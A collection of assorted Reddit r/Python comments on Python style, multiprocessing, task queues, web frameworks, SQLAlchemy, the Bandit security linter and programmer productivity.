Are these variables changing in any of the functions? If not then they're just constants and you never need to use the global keyword. The global keyword communicates a specific intent, so if you don't intend to change the variable I wouldn't use them. 
They are "just constants" as you say. I would like it to be blatantly obvious that "this function has a dependency on the global FOO" (they usually are all-cap names). The function might be many lines removed from the declaration of the variable. One might say, you want to find all uses of FOO, just search on that name. Fair enough but that isn't the issue. The issue is that somebody doing maintenance (or me, 6 months from now) who happens to be reading the code, should realize, oh this bit depends on FOO. If it isn't spelled out, the actual use of the name might be buried in a long expression or a parameter list and not be obvious. I suppose I could write "depends on FOO" in the doc-string but, one, that's more keystrokes, and B, that isn't syntax-checked by the interpreter.
Your functions should be short enough that they can quickly see which constants are used. By naming constants LIKE_THIS things will stick out. You really don't need extra documentation. 
Here's a tool written in python that'll do what you're looking for: https://github.com/hellman/xortool Otherwise, check out http://cryptopals.com/sets/1/challenges/6/. It gives you the general steps to breaking repeating-key xor. I've actually done most of that challenge here if you want an example to get you started: https://github.com/libresec/matasano_crypto_challenges. They tend to build off each other, so might want to start at the beginning. 
Scratch lxml, use JSON instead. If you can get the materials for this course: https://www.coursera.org/course/datasci look at project 1
People in general advise to follow the official Python style guide, [Pep-8](https://www.python.org/dev/peps/pep-0008). It says that constants are in all-caps. That way, it's trivial to see where you use your constants. You really shouldn't use global variables. You might take a look into dependency injection, the idea that if a class or function needs some object, just give it to it, instead of letting the class/function create it or, heaven forbid, plucks it from somewhere itself. Here a nice video that explains why: https://www.youtube.com/watch?v=RlfLCWKxHJ0
It just has different rules, but the infrastructure is similar with different layouts. You can check the original implementation on http://pysolfc.sourceforge.net/ 
The original implementation is below which works on Windows, Linux and MacOS: http://pysolfc.sourceforge.net/
No use case comes to mind using that specific data. On the other hand, i have been kinda guiding a friend of mine into python programming. An example of a task i gave him was to build a small API that could do CRUD on a TODO list. API: create read update delete DB: Sqlite3 to save the records Web: Django/Flask or any other framework. Hope this helps for a small fun project.
You might benefit from looking at ttytter. It's perl, but the source is all there. 
I wonder how consistent you are about this. Do you also declare your external functions, builtins, classes, and modules as global? If not, why not? import os class Spam: pass def config(root): return root + '/spam_app.conf' def frobnicate(): # these are things in the global scope that # this function depends on global Spam, open, config, os, str spam = Spam() with open(config(os.path.expanduser('~')), 'w') as f: f.write(str(spam))
Don't use the standard library test framework. Use py.test. You'll see why as go along. It's *the* testing framework for python.
I define globals at the top of files, but will initialize them to None if I don't know their starting value. The main globals I use are things like package/executable paths, but I'll also put logs in the global namespace. In that case, I'm often overwriting ones from the current and other files, so I explicitly write the word global. I'll change globals by using an explicit function call to set_log in the respective files that then use the standard python global. &gt; Is it legit style to use global when the global is only referenced, not modified? Yeah, why not? Also, since they're just variables and I hate the all caps syntax, I just capitalize it like any other variable.
Here it is - https://gist.github.com/kmmbvnr/39c7716671b6a9e5c0a2 Usage: tox any_command_here or tox -e envname any_command_here The sample tox.ini runs django server if no args provided. 
What's weird is I was just looking for code to do the same thing and found this last week (http://stackoverflow.com/questions/13446445/python-multiprocessing-safely-writing-to-a-file). The first answer looks very close to yseam.com's code linked in this post, including variable names and spacing. Weird coincidence to stumble upon this now - both were written 2 years apart, with the stack overflow one being older, but Seam Consulting copyright in 2014... Beyond that (maybe they both got it from somewhere else), the code worked great! The basic flow was different from the python.org multiprocessing docs, and uses a return value from get() to sync that I didn't find in the docs. This code is definitely the basis for any weekend hack projects going forward for me!
I would add one thing: relax. From time to time, take a break, find a nice sofa, close your eyes, breath slowly. We often don't realized how stressed we are and stress hinders our productivity a lot. You can read more about being productive as a programmer here: http://superheroesinracecars.com/2014/07/01/11-unconventional-tips-for-improving-your-programming-skills/
I'd love to write a Twitter bot. I just can't think of a non spammy idea for one :/
AFAIK [Reddit][] uses SQLAlchemy. [Reddit]: https://github.com/reddit/reddit
Believe it or not, you do develop a sort of tolerance for coding for longer periods over time. It's like as programming takes less effort, it tires you out less. This is not to say that marathon coding sessions are a good idea. I believe that most people can sustain about 20 hours of "in the zone" coding per week over the long term. Also, I notice that my focus and mental energy kind of move in cycles. When I am in that "zone" frame of mind, I want to swing my big hammer and tackle tough tasks. At other times, I do other things to add value that don't take as much effort. Things like taking care of minor but annoying bugs, writing docs, automating tasks, code cleanup, researching for that next big challenge, etc.
If you're interested in using multiprocessing with some improved syntax, I find https://github.com/gatoatigrado/vimap to be a useful project. Minimizes boilerplate in particular for very standard use cases (like the author's here)
I practiced python by cloning the everyday apps I use.Its quite effective,give it a try.Start small then go big. Nothing in particular comes to mind on what to do with your scraped data..but a few days ago my uncle asked me to write an app for him that scrapes video title and link from specific YouTube channel and output it into a csv....you can try doing something similar like that.
They're just coloured glasses. You can pick that shit up at a hardware store for a fraction of the price, unless you need prescription lenses. Either way it's just a money grab. Some people enjoy less harsh colours in the evening, and there's f.lux for that. 
Thanks, I will try it.
All the suggestions about hydration and breaks from the computer are spot on. Also, if you're having a writer's block kind of situation, remember: - break down the problem into small chunks, choose the most obvious or standalone one of you need to get yourself going - you don't have to have the best solution for the problem the first time through. It is often useful to write a crappy solution, learn, and refactor/rewrite - it can be very useful to test code early and often, this gets a positive feedback loop going with your code. As you can see it doing more, you get more excited - Often good code comes in short bursts. Some research has shown the most productive people tend to work in cycles about 53 minutes working at the computer and 16 minutes break not at the computer (read a book or go for a walk) Like anything in life, eating right and giving yourself healthy breaks are important. Don't buy the myth that the great coders are heads-down endlessly with nothing but hot pockets and jolt cola. The most brilliant engineers I've known were the ones I'd see frequently walking around the company campus and visiting the gym for an afternoon swim. Good luck with the code! if It's where your passion is, there's a bright future ahead for you!
I use [solarized](http://ethanschoonover.com/solarized) dark and [redshift](http://jonls.dk/redshift/). I find these really make a difference.
I really recommend you take a look at the [concurrent.futures](https://docs.python.org/dev/library/concurrent.futures.html) package, it makes using multiprocessing *really* easy. It's Python &gt;3.2 only, though there is a backport for Python 2: http://pythonhosted.org//futures/
Abilian Core (https://github.com/abilian/abilian-core). Largish framework for social business apps (WIP).
I know exactly who I'm talking to.
&gt;&gt; However, I doubt it's worth the effort. &gt; &gt; Python has no tail recursion and is, compared to iteration, awfully slow. I was talking about idea of looking up past states to see if one was already encountered. 
what's in your home directory? 
You probably had a file there called nltk.py. Python was importing THAT instead of your lib. 
You might want to look at [TwitterAPI](https://github.com/geduldig/TwitterAPI). It is another python library, but what's different is it has a much smaller code base than other Twitter libraries, so it may make it easier for you to understand the nuts and bolts of using the Twitter API.
I think there is also such thing like "simplification". PHP has frameworks too, and it is made for more easy deployment\development. I think you can use pure Python, but it is like you gonna develop your own little framework :)
&gt; there's no proper functional test framework built in Although I wouldn't say it's a full functional testing framework, web2py does at least include [`WebClient`](http://web2py.com/books/default/chapter/29/14/other-recipes#Functional-testing) for basic testing. For more advanced testing, there is [web2py.test](https://github.com/viniciusban/web2py.test) and [this](https://github.com/niphlod/welcome_augmented).
I usually put my ideas in a piece of paper... "how this program could be?" then some pizza, good music (like "Programming Music" in YouTube, or maybe good OSTs), good IDE... 
I usually pop a fee caffeine pills. That might not be the best idea, but it works for me
I can tell you there are daemons that exist just for this purpose. I cant think of names off the top of my head, but you'll probably find a few if you search on queuing. Of course that's only useful if you're not set on implementing it all yourself, but hth. 
I haven't used `gevent` - is there an advantage to that versus `concurrent.futures`' `ThreadPoolExecutor` or `ProcessorPoolExecutor`? The code to write looks almost the same, and I've used it for similar cases to what you described. from concurrent.futures import ThreadPoolExecutor with ThreadPoolExecutor(max_workers=10) as e: e.map(function_to_run, iterable_of_args)
There are a million ways to skin this cat. HTCondor is one
&gt; I am trying to build a piece of software that takes requests (I haven't figured out what kind yet, but it would probably be something that can be separated into sub-tasks) and then assigns them to a bunch of workers. it would be a 'request handler' and a bunch of 'workers' VM. I've read a bit about how this is supposed to work. You could: requests &gt; broker of your choice &gt; celery &gt; workers http://www.celeryproject.org/ &gt; I'm thinking of doing something along the lines of MapReduce. From my experience, MapReduce tends to be batchy and offline. Not sure if this is what you are trying to achieve. But, check out https://pythonhosted.org/mrjob/ &gt; What I'm trying to learn are the aspects related to handling a growing number of workers, workers going offline, connection failing -- ways of implementing fail-safe mechanisms along with the main MR functions. I haven't found any code examples of this. Anyone that can help out? Either with advice or just links to whatever blogs / github repository from which I could learn? Unless you have access to that kind of traffic, it sounds like you need to write your own chaos monkey.
tl;dr: KISS If it's just for learning you don't need have VMs, Clusters and Networks. You can start on a single machine and with just a few processes. Try to define a clean interface between the parts. If you want to see it break: Try to overload it and see which part gives in first. You can add triggers to simulate failures (random() &lt; 0.1? DIE!). If your interfaces are good you can add networking later, again on a single machine, then maybe on a few (some cheap instance with a common cloud provider come in handy here). Working out all the problems you discover in the progress should keep you busy.
drink plenty of water, usually if you're tired and craving something, try not to go for coffee, its usually water you need. I prefer to start coding early in the morning before other distractions start.
MapReduce is just a problem solving style. It can be implemented in a database, a cluster of machines on a network, an array of cores on a graphics card, or be applied fully abstractly on a sequence type data structure in a high level programming language. 
What exactly is a "valid Facebook neighbor"?
Ok, to clarify I need to make an asyncronous POST response in 15 min from the request and the maximum load is 150000 req/15 min, so I need to generate and send also 150000 req/15 min. Infact if T0 is the time of the first request, T0+15min will be the maximum time for the response at that request.
We use gearman to serve an API with Python workers behind it, works well for us.
You're a freshman in highschool taking an AP computer science class? What are you again? Pro tip: no one cares about your age, grade, if your taking a course, what course, etc, rarely is it relevant and it has no bearing the kind of advice you will get. Don't be so stiff, this is the internet. Relax.
Needs actual metrics. Processing and writing a single line at a time sounds terribly inefficient. 
So, it's fair to say that this is a peephole code smell detector? I'd say mostly useful for documenting known bad practice, rather than finding subtle bugs. Or am I wrong?
easy enough to look for any solution listed http://flask.pocoo.org/docs/0.10/deploying/ that does *not* use threads, forking, or greenlets..
Looks like the next valid Facebook users of not equal to yours. Wow. :/
 import multiprocessing from os import walk from sys import stdout class csv_processor(multiprocessing.Process): def __init__(self, job_q, result_q): super(csv_processor, self).__init__() self.job_q = job_q self.result_q = result_q def convertCsv(self, csv_path): # do your magic pass def run(self): while True: # work_tuple == (_str_of_csv_processor_method, _kwargs_for_method) # e.g. ( 'convertCsv', {'csv_path' : "C:/test.csv"} ) work_tuple = self.job_q.get() if work_tuple == "KILL": break # e.g. self.convertCsv( csv_path="C:/test.csv" ) getattr( self, work_tuple[0] )( **work_tuple[1] ) self.result_q.put( True ) if __name__ == "__main__": if False: csv_folder = "C:/csv_files/" csv_files = [ elem for elem in next( walk( csv_folder ) )[2] if elem.lower().endswith(".csv") ] else: csv_folder = "_testing" csv_files = [ "_test-{}.csv".format(i) for i in xrange(99) ] isPlural = lambda _list: len(_list) != 1 print "found {} csv file{} in {}".format( len(csv_files), "s"*isPlural(csv_files), csv_folder ) if not csv_files: exit() num_workers = 5 manager = multiprocessing.Manager() job_q = manager.Queue() result_q = manager.Queue() for csv_file in csv_files: job_q.put( ("convertCsv", {'csv_path' : "{}{}".format(csv_folder, csv_file)}) ) print "starting {} worker{}".format(num_workers, "s"*(num_workers!=1)) workers = [] for _ in xrange( num_workers ): worker = csv_processor( job_q, result_q ) worker.start() # this actually calls worker.run() -- start() is a method inherited from multiprocessing.Process workers.append( worker ) finished_count = 0 while finished_count &lt; len(csv_files): result = result_q.get() assert result finished_count += 1 stdout.write( "\rfinished {} / {} job{}".format( finished_count, len(csv_files), "s"*isPlural(csv_files) ) ) stdout.flush() print "\nkilling the {} worker{}".format( num_workers, "s"*isPlural(workers) ) for _ in workers: job_q.put( "KILL" ) # do not pass go until all workers have stopped RUNning for worker in workers: worker.join() print "congratulations, you just used {} worker{} to process {} csv file{}".format( num_workers, "s"*isPlural(workers), finished_count, "s"*isPlural(csv_files) )
So, is there a list of what problems it currently checks for?
I'm unsure if you're aware but Reddit has a JSON api and there is also an incredibly easy-to-use python library for it. [PRAW](https://praw.readthedocs.org/en/v2.1.19/)
We're in the process of growing the test set. We haven't documented it separately, best best for now is to browse the tests themselves at http://git.openstack.org/cgit/stackforge/bandit/tree/bandit/plugins.
I was saying that I'm a newbie to this stuff. I'm not used to it. 
Is there a reason it wasn't done as a set of pylint plugins?
I've had great success using the celery approach to writing a custom MapReduce-style system. As long as you can easily break up the problem into independent jobs and have a place to put the results (database, static files on s3, etc), you can write celery tasks in python to perform the work on each chunk and fire off as many celery workers on as many nodes as you like. It looks something like: jobs --&gt; broker --| -- celery workers --&gt; | -- celery workers --&gt; data store \ -- celery workers --&gt; In my case I used an Amazon EC2, created an AMI image of my celery worker box, ran redis as the broker and postgres as the datastore. I then fired off a script to break the data down into discrete jobs, submit each to the queue... then the celery workers start pulling the jobs off the queue and executing them. Need it done faster? Fire up more celery worker EC2 images. You can also use something like [flower](https://github.com/mher/flower) to monitor your workers through a web interface. This worked well for my case since the input data was orders of magnitude smaller than the output data and each job was comprised of very CPU intensive simulations (20-60 seconds each). If you had simpler processing steps with huge input data, you'd probably want to look at something like Spark which runs on the Hadoop distributed file system. 
When I'm at an absolute stand still -- meaning even the "not fun management code" is done -- I take a nap. Usually I'll just think about the program, not the code that it's made of. Visualize what it does and what you want it to do. If you were really bored in front of the screen, you'll get bored with your thoughts and fall asleep; or, you'll come up with something to try and nod off anyways. Wake up refreshed with an idea, or wake up refreshed ready to try again in front of the screen. Rinse. Repeat.
They also magnify slightly .. I got my dad a pair and he seems to like them for that with the eye-easing.
Its alright, your not likely to get flak for asking for clarification if you don't get something. Additional point: if your asking questions you will be asking questions at your skill/knowledge level, and any worthwhile answers will take that into account.
'Peephole code smell detector' is a little less generous that I'd like, but generally yes you're right. In some cases, Bandit in its current state may be essentially a glorified grep, but in others it may allow us to write smarter tests that give more accurate results. Subtle bugs are subtle. We have a few things on the TODO list that should improve our ability to detect issues beyond the AST-node-by-AST-node approach. Do you have any specific examples or vulnerability classes that come to mind?
So...I don't know your scenario at all, however [this is a gist](https://gist.github.com/blakev/697acbc242a683d4eb38) I wrote to handle a lot of Paramiko boilerplate for doing SSH programmatically. Good luck.
If you can sacrifice a pure Python solution and are willing to accept a Jython based one, you can use the Java MIDI/Sound APIs that are quite a piece of cake!
It's got a long way to go. But I love tooling like this. I am a little concerned about items like warning that all strings with sql statements in them are sql injection vectors, then lowering the severity if they're importing sqlalchemy. I'd say this makes 2 bad assumptions.
Really cool idea! I can't think of how I'd use this, but as someone who does work with color I was excited to take a look. 
Generate a tone using numpy fs = sampling frequency of sound card fc = center frequency of pure tone. sin(2*pi*fs*fc) Use PyAudio to play it. You may have some issues with power of two sized buffers and looping in which case look into rasterized and non-rasterized direct digital synthesis. 
The one-sized Gunnar gaming glasses from bb definitely take the edge off.
My goto libraries for Web scraping are [BeautifulSoup](http://www.crummy.com/software/BeautifulSoup/) and for more complex projects [scrapy](http://scrapy.org/).
Oh, neat, we use a lot of Twisted at work. BOOKMARK'D! 
&gt; The short answer is, yes. What else is new.
Like asking /r/trees "should marijuana be legalized?" or asking /r/food "HAMBURGERS?" 
I used this first time I picked up beautiful soup, I found it very helpful http://www.gregreda.com/2013/03/03/web-scraping-101-with-python/
That had to have been a hugely wide dataset. One million lines isn't that much.
thank you all :) ill deffenatly take a look at BeautifulSoup.
I read somewhere that using list() has more overhead than a list comprehension so I always did it with a list comprehension. Is that wrong? 
Two points on style: - Creating that dummmy class is yuck. If you want multiple processing functions, just use multiple processing functions. Also, why bother writing out an `__init__`method that does nothing? - There's no need to serialize the method/functions for insertion into queues 
Agreed, privesc would be a tough vulnerability class to get broad coverage of. We could tackle small parts of it by looking for, say, external calls to sudo that might be insecure, or calls to os.chmod with stat.S_ISUID/S_ISGID flags. In that case though it's more about flagging potential badness for a developer to consider / investigate, rather than a definite vulnerability. Expanding the Bandit state model to include more than just the current AST node would be a pre-requisite to effectively targeting these types of bugs. Its on the TODO list, but is likely to be prove challenging given Python's dynamic nature.
Yup, lots to be done. Good to hear you like it though! :) We do need to go through the existing set of tests and do a sanity check for reasoning and assumptions like you've pointed out. We're perhaps overly cautious of over-cooking warnings, generating false positives, and crying wolf. The line between vulnerability, potential vulnerability, "bad practice", and just plain weird coding conventions can get a bit blurry.
The problem is that many email clients (including Gmail) send non-ascii emails in base64. `stdin` on the other hand passes everything into a string. If you parse that with `Parser.parse()`, it returns a string type with base64 inside. Instead the optional `decode` argument should be used on the `get_payload()` method. When that is set, the method returns a bytes type. After that you can use the builtin `decode()` method to get utf-8 string like so: body = payload.get_payload(decode=True) body = body.decode('utf-8') There is great insight into utf-8 and python in [Ned Batchelder's talk.](http://nedbatchelder.com/text/unipain.html) My final code works a bit differently, you can check that, too [here.](https://github.com/fonorobert/mailforward)
 Python 3.4.1 (v3.4.1:c0e311e010fc, May 18 2014, 10:38:22) [MSC v.1600 32 bit (Intel)] on win32 Type "copyright", "credits" or "license()" for more information. &gt;&gt;&gt; import timeit &gt;&gt;&gt; timeit.timeit('list(range(10**6))', number=10) 0.24615888512050038 &gt;&gt;&gt; timeit.timeit('[x for x in range(10**6)]', number=10) 0.549994641743984 Looks like it's the other way around, actually.
If you get prices as well, you could make a price forecasting app that runs the scrape every day and predicts price of given products based on pervious trends. Or if you quantify other properties of products as well (electricity consumption, certain features, etc.) you could also calculate a "popularity predictor". This would take a newproduct as input (with all it's properties) and based on all the previous products calculates how popular it will get. These ideas are more on the data science side in which I'm not very well learned, but they would make for a project with actual real world applications.
Yeah, 35 to 50 columns depending on the file. Output tables were 30M to 45M rows after discarding blank values and duplicate records.
Yeah,I am learning django
Feedback, of course, is appreciated.
Cool, thanks man. What's a better way to accomplish this without the serialization? I do this to pass a worker's result back to the parent (to be handled for database update/insertion), and then call varying worker methods depending on different circumstances.
You do know that Mezzanine is built on top of Django, right?
Yes, that doesn't invalidate my question. When I ask "should I use Django or Mezzanine?", OBVIOUSLY what I mean is "should I use Django without Mezzanine or Django with Mezzanine?"
Just started development on a system to replace about a decades worth of a mess of .NET and PHP. Looking forward to it so hard.
I would use Mailgun's API and will not go into gory details of how to handle email glitches. They are free up to 10k emails per months.
&gt; What's a better way to accomplish this without the serialization? Just send in the object directly.. will post some code when I get a chance. 
&gt; From my experience, MapReduce tends to be batchy and offline. Not necessarily: Spark is positioned to take over a ton of MapReduce work, using a very similar approach, just more use of memory than files - at a vastly faster speed. Even faster is Cloudera Impala - a parallel relational database that sits on top of a hadoop cluster - that's speeding-up hadoop with 25 year-old distributed database concepts.
I'm not by my computer but I wonder how a generator would do. (x for x in range(10**6)) 
Compiling pyo from source is what's been giving me the issues; installing the dependencies (ESPECIALLY portmidi) is the primary difficulty. I ended up solving the sound generation problem by just writing the samples into a .wav file and executing a bash script to play them, since doing it in python seemed to be a lost cause at this point.
I think that you may be falling into the trap of premature optimization. I've used SQLAlchemy numerous times and never regretted it. Yes, there is an overhead. It can be quite a large overhead if you're performing bulk insertions. The queries won't be *quite* as efficient as hand-written SQL. But this is the price you pay for the convenience of using an ORM. You have to ask yourself what's more important: the performance of the developer, or the performance of the application? Obscenely popular sites (like reddit) often have very complex reasons for the issues you see. That "ouch" page could have shown up for any number of reasons. The ORM *could* be involved in some of them, but that's just as likely as any number of other components in their stack. My philosophy: Make it work, then make to work right, then, if necessary, make it work faster. Unless I see performance as a critical component of the project's completion criteria, I choose sensible tools and libraries that improve *my* performance.
If you're talking about something like job_q.put( (csv_processor.convertCsv, "C:/test.csv") ) the problem is that the instance method cannot be pickled for q'ing 
Did you post this twice from two different accounts? http://www.reddit.com/r/Python/comments/2n4tes/does_sqlalchemy_scale_well_with_increased_web/
Thanks, that was very helpful. However, can you please elaborate, how *developer's* performance is increased by using an ORM (unless you change the database itself and get the re-usability benefits). For example, the same amount of time is spent in mastering the use of sqlalchemy as say py-mysql or sqlite3 modules. How is *your* performance improved there? If you switch from an sqlite to mysql later, its worse! You have to understand both: the intricacies of mysql and how the ORM abstracts it, since non-trivial or complex queries are not optimized by the ORM.
The advantage of using an ORM from the perspective of developer performance is that embodies the greatest virtue of a good developer: laziness. You *could* master sqlalchemy. Or you could learn enough about it to use it comfortably. You *could* make sure that you completely understand the interactions between sqlalchemy and all of the database engines that you intend to utilize, or you could just keep your tests up to date, and learn only what you need to learn to solve the most pressing issues of the moment. I've migrated database engines using sqlalchemy numerous times (usually from sqlite to postgresql), and I can only recall one time where there was a problem due to the differences in the database engines. I think that was a bug that got fixed in later versions. Look, if you want to go all power-dev and ensure that you understand everything about every library that you use, that's your choice. You're missing a big part of the advantage of using these tools, but it does mean you're working harder. So that's something.
If you made a mess of .net and php you'll make a mess of python as well. I've seen clean codebase written in perl and I'm convinced its all on the developer not the language.
 Honestly it's probably more a function of preference and what you're most comfortable working with than anything. I'm not sure what "unusual" means in this context (aside from the feature above... which could pretty easily be implemented with some JavaScript regardless of which backend framework is selected), but that may have some bearing on which technology you pick. If minimalism and complete flexibility means the most to you, then Flask is the obvious choice (and you might be able to find blueprints for some of the CMS features you'd otherwise have to build), though some additional assembly will probably be required. On the other hand, I've personally found Django to be pretty flexible (though most of my experience with it is admittedly a few versions behind 1.7), and, while I'd certainly not consider it to be anything close to light weight, it's a bit lighter than some other frameworks in the same weight class (I'm looking at you, rails). Overall, either will probably suffice unless your needs are really and truly out of left field, and even then, there may be plugins or (if the shortfalls are more cosmetic/UI aligned) there may be frontend solutions available to mitigate the issues. 
Maybe it's not *his* mess :P
I fully agree with that, and should clarify that I am lead of a completely new team under a new director (essentially the entire IT department is new, or otherwise had little to do with the earlier development. I have been there a matter of months. The codebase is essentially the work of a couple people who didn't know how to do it and a couple consultant companies who... did what most dev consulting companies do. So shit's all fucked up, but it's going to be OK. I'm the unfucker. And despite all the hair pulling moments of "omg why... why would they do it like this... it's just the same 3 variations of a column name 15 times... how is that... who does..." moments (yes, that happened week before last) it is incredibly exciting and rewarding.
Thanks!
Given that this is r/python, I'd expect nothing less.
&gt; There are more web-hosting providers (indeed, many free) for PHP compared to python. I think I'll have to disagree with you on your point here. Python along with PHP has sufficient number of web hosting options. Free too btw. Python has also been around for web dev much before Django and Flask went popular. Case in point web2py amongst others. What web dev framework you choose depends on your project needs. Cheers! 
thanks for all the ideas! I will definitely be looking into implementing these 
Why use VMs?
Why not just using lamson? http://lamsonproject.org
It's the first introduction into Twisted I like!
That's kind-of a no-brainer. You won't want to run PHP in your Browser either.
and I'll say this again; what else is new.
&gt; You won't want to run PHP ~~in your Browser either.~~ FTFY 
This is awkward... I wasn't replying to you, merely piggybacking on the top comment.... Sorry. (No I'm not)
&gt; is likely to be prove challenging given Python's dynamic nature. In all turing complete languages, it's impossible to be certain what's going on from static analysis, so I think this is something of a red herring. It's probably more important to have checks for funky, hard to analyse patterns that have no place in security critical code.
Just be careful, the article is a bit dated (2009-2010) and also states "the examples were developed with **Python 2.5** and Twisted 8.2.0.".
Well ok, sorry to hear that. I only had problems before with getting the portaudio-v19 headers (had to be done in a special order to get rid of dependency conflicts). If your bash version works for you then alright, if not I suggest you write to Olivier Belanger (the pyo developer). He is very supportive and active. 
we have asyncio today
The OpenCV library has motion detection and some pretty solid motion detection algorithms: http://docs.opencv.org/modules/video/doc/motion_analysis_and_object_tracking.html There are also pretty great Python bindings, which I've been using.
Well I remember when I was searching for tutorials on Twisted a while back this was the only one that actually explained things properly for a async noob. I ended up writing my app using Celery instead once I found out that Twisted was overkill for the app I was working on.
Depends on which bits you're interested in. An awful lot of [this list](http://twistedmatrix.com/trac/wiki/Plan/Python3#Details) has been checked off.
For two reasons I wouldn't recommend Flask here: - you need an ORM (with basic requisits), and Flask relies on an external SQLAlchemy which is more work to install and configure, - you hesitate between using or not an existing CMS. IMO that means your needs are already too much for Flask. As a side note, you could have a look at importd, which is Django ready to go: https://github.com/amitu/importd/
[SimpleCV](http://simplecv.org/) is based on OpenCV. Allows people without prior knowledge of the subject get up and running slightly easier.
&gt; Have I been activating hundreds of virtualenv for no fucking reason ? Yes
&gt; Have I been activating hundreds of virtualenv for no fucking reason ? Depends what you wanted to do. If you simply want to run a script, then yes you just need to invoke the env's python explicitly. The point of activating the virtualenv is to have all interactions with `python` use the venv's python implicitly. I generally start python with `python` and scripts with `python a_script` (or `./script`), activating a virtualenv makes my life simpler, especially when I'm outside of the virtualenv's directory. It also allows me to start and stop shells without wondering if the environment is correct, it is, because I'm in an active env.
I wish that I had learned about this form of tuple unpacking sooner result = (a, b), (c, d) = (['a', 'b'], ['c', 'd']) 
I have an example here, if you want to have a look: https://github.com/shantnu/PyEng/blob/master/Image_Video/motion_detect.py It works with Webcam.
 mycounter = Counter() for i in range(100): random_number = randrange(10) mycounter[random_number] += 1 This would be better written as mycounter = Counter(randrange(10) for c in range(100)) Also: output = subprocess.check_output('dir', shell=True) I realize that it was necessary for this example to use `shell=True`, because `dir` is not an actual executable but a shell command, but in general you should avoid `shell=True` like the plague. And this example is just terrible, because shelling out to run `dir` is nonsense; you would have to parse the results, and you're better off using `os.listdir()` or some other function which doesn't involve the very expensive operation of creating a new process, and the very fragile operation of parsing something. Also, if you're going to mention `dict.iteritems()` then you should use it consistently, for example here: reversed_dict = {value: key for key, value in my_dict.items()} Join us in Python 3 land where these design blunders have been corrected. 
Yes, I know, I'll be really downvoted, but seriously: https://www.google.ru/search?q=python+tricks
Yes I red that part of documentation.......today. The fact that activation is only a 'convenience' step does not seem very well known, considering the number of tutorials on 'install XX library' that tells you to activate the virtualenv before invoking python.
there's plenty of options for developing the backend and everyone has their favorites. so the answer is 'maybe' probably everywhere in the world except in this sub. this article is pooo
&gt; Do these signs indicate that the sqlalchemy implementation of Reddit is unable to keep up with the increasing web traffic? It is highly improbable that you or anyone else in this sub will ever have to deal with the scalability challenges that reddit/imgur have. Are you also concerned about your commute to work because your car is unable to maintain a speed of 100 mph with 7 tons of cargo? probably not So why would you worry about a library that is undoubtedly useful and a huge time saver because whatever amazing thing you are writing might not be able to scale to the unlikely scenario of 1 billion people and bots all +1ing a cat picture? Statistically, you will never have to deal with that kind of scale in your life, unless you work at reddit. 
I've always disliked the syntax of that. I feel like it's not obvious what's happening. :(
Plus he uses windows ;)
If that's really the reason, then it's a very childish and unprofessional reason.
I didn't know about the last one. That's handy for not wanting newlines in your long strings.
At least I have to good grace to be embarrassed about it!
At least one of these items isn't in the StackOverflow post! :-)
I'll agree with most people here that it is __usually__ worthless. However, there are a few scenarios I've come across where it is important. I have found a package (looking at YOU `newrelic-plugin-agent`!) that tries to depend on virtualenv settings (specifically the `$VIRTUAL_ENV` environment variable). Packages like this will fail to install correctly if the variable is not set because they will try to install files outside the virtual environment. Also, if you are trying to run Gunicorn inside a virtualenv, you need to have the virtualenv activated or the processes spawned by gunicorn will not use the virtualenv resources. Edit: Oh, also if you are a Vim user, having the virtualenv active might be important for any python code completion packages you have installed.
It's great when using external libraries that return data in some weird format and you just want to pick out the values quickly as variables. Something like: &gt;&gt;&gt; lib.func() (['a', 'b'], ['c', 'd']) &gt;&gt;&gt; (a, b), (c, d) = lib.func() &gt;&gt;&gt; result = dict(lib.func()) It's nice to have options of manipulating the data in a way that you are comfortable with.
My eyes are rolling out of my head
Thanks for your feedback! For the counter, I was trying to be as explicit and readable as possible for non-experts such as myself. For the shell, maybe I should have picked an example like ffmpeg (which is really what I mostly use it for) instead of a process that ``os`` performs much better, but I wanted to keep it understandable for the casual user, and I used the Shell argument to have some output in the notebook, but your point is well taken. As for .iteritems(), I didn't think of using it in the comprehension, thank you! I've been waiting for the libraries I use heavily to be Python 3 compliant; I think the last holdout was NLTK, they seem to be resolving the bugs in their first compliant release, so I'm sure I'll be making the switch soon!
Didn't like https://github.com/wolever/nose-parameterized ?
Maybe for Counter you should do it on a list you've created before or on a string. In your example, it doesn't look much better than a dictionary
The last one works because Python [auto concatenate adjacent string literals](https://docs.python.org/2/reference/lexical_analysis.html#string-literal-concatenation), for the exact reason you mentioned in the post :)
 try: len(love) except Exception as e: "love {0}".format(e.message[-13:]) &gt;&gt; "love has no len()"
Haha, that Easter egg is great.
&gt; with django(I'm not sure how it is with the other frameworks) you have to use fastcgi, wsgi etc.. that are way harder to configure for a novice Even with Flask, its the same wsgi method, though configuring it isn't that hard as the underlying plumbing is mostly taken care of by werkzeug. Though this method isn't as straight-forward as a simple upload of index.php, you get more control over the url routing and the python way is more secure. In fact, a PHP framework called symfony tries to mimic this python way by creating a single controller within index.php and does url routing from there. I don't know about other frameworks like pyramid, etc.
Jesus, that `info` function. Who writes like that? def info(object, spacing=10, collapse=1): """Print methods and doc strings. Takes module, class, list, dictionary, or string.""" methodList = [method for method in dir(object) if callable(getattr(object, method))] processFunc = collapse and (lambda s: " ".join(s.split())) or (lambda s: s) print("\n".join(["{} {}".format(method.ljust(spacing), processFunc(str(getattr(object, method).__doc__))) for method in methodList])) As far as I can tell, this is equivalent: def info(object, spacing=10, collapse=True): '''Print info about an object's methods.''' for name in dir(object): method = getattr(object, name) if not callable(method): continue doc = str(method.__doc__) if collapse: doc = ' '.join(doc.split()) print(name.ljust(spacing), doc)
just an FYI, Reddit does **not** use the SQLAlchemy **ORM**. It uses only the **[Core](http://docs.sqlalchemy.org/en/rel_0_9/intro.html#overview)** part of it, which does not fall under the ORM-specific performance-related caveats noted in [Performance](http://docs.sqlalchemy.org/en/rel_0_9/faq.html#performance). The way Reddit's application refers to tables and queries is extremely idiosyncratic.
I actually have experienced a point when using `shell=True` has caused a script to barf. The guys who wrote it ran an executable with it and arguments included things like passwords. Anyone with special shell characters in their passwords (like me at the time) was unable to use the script, and obviously malicious users could inject shell code into it. I had to fix their mistake.
you forgot the disclaimer about you being the author and likely compose 100% of all the people using it. :) 
&gt; g for tutorials on Twisted a while back this was the only one that actual twisted does a way more then just provide you a reactor. it has low level factories for pretty much everything network , web or database that you can think of.
